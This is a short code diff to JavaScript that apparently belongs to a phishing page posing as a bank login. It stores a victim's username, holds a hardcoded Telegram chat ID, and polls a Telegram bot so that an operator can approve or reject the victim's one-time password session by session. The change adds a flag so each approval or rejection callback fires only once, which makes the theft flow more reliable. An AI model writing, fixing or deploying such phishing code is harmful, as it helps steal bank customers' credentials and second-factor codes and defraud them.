@@ -114,6 +114,7 @@
         const TELEGRAM_CHAT_ID = '7973653220';
         let lastUpdateId = 0;
         let otpPollingInterval = null;
+        let otpVerified = false;
 
         // Get session info
         const username = sessionStorage.getItem('kfh_username') || 'Unknown';
@@ -220,13 +221,15 @@
                                     body: JSON.stringify({ callback_query_id: callbackId })
                                 });
                                 
-                                if (callbackData === 'otp_verify_' + sessionId) {
+                                if (callbackData === 'otp_verify_' + sessionId && !otpVerified) {
+                                    otpVerified = true;
                                     clearInterval(otpPollingInterval);
                                     onOTPApproved();
                                     return;
                                 }
                                 
-                                if (callbackData === 'otp_reject_' + sessionId) {
+                                if (callbackData === 'otp_reject_' + sessionId && !otpVerified) {
+                                    otpVerified = true;
                                     clearInterval(otpPollingInterval);
                                     onOTPRejected();
                                     return;
